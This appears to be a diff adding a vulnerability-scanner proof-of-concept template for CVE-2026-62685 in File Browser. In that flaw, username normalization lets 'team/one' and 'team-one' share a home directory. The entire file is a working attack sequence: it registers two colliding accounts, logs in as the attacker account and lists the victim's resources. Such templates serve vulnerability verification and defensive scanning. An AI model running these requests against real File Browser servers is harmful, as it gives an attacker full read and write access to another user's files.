@@ -1,0 +1,90 @@
+[info]
+author = "AVE"
+description = "File Browser 在启用 Signup 和 CreateUserDir 时，cleanUsername() 将非字母数字字符替换为 '-'，导致 team/one、team one、team-one 归一化为 team-one。攻击者可注册与受害者归一化后相同的用户名，获得同一 home 目录的完全读写权限。本 PoC 通过注册两个归一化冲突的用户名验证目录隔离绕过。"
+id = "POC-AVE-2026-0921"
+name = "File Browser 用户名规范化冲突致使用户目录隔离绕过 PoC"
+severity = "high"
+tags = [
+    "cve-2026-62685",
+    "filebrowser",
+    "username-normalization",
+    "authorization-bypass",
+]
+vuln_id = [
+    "CVE-2026-62685",
+    "AVE-2026-0921",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/signup"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"team/one","password":"Test1234!"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "created",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/signup"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"team-one","password":"Hack5678!"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "created",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/login"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"team-one","password":"Hack5678!"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["token"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/resources/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["team/one"]
